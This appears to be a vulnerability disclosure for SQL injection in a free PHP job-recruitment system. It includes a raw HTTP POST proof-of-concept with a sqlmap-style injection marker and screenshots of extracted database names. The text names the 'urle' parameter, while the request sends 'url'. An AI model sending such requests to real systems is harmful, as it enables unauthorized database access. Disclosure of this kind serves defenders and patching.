# job-recruitment-in-php has sql injection vulnerability in urle  parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
urle parameter

## describe

 urle parameter. An unrestricted SQL injection attack exists in a job-recruitmentsystem. The parameters that can be controlled are as follows:  urle parameter . This function executes the urle parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of   $_POST['urle'] is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241226013202817](https://github.com/user-attachments/assets/ee2c638e-5de7-480e-9eaf-c9b00c1580bc)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=cn_update&cname=1&url=1*
```

**Result**

get databases name

![image-20241226013414568](https://github.com/user-attachments/assets/904824cd-0bf6-42e8-a072-fdaf5345c6fd)

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)
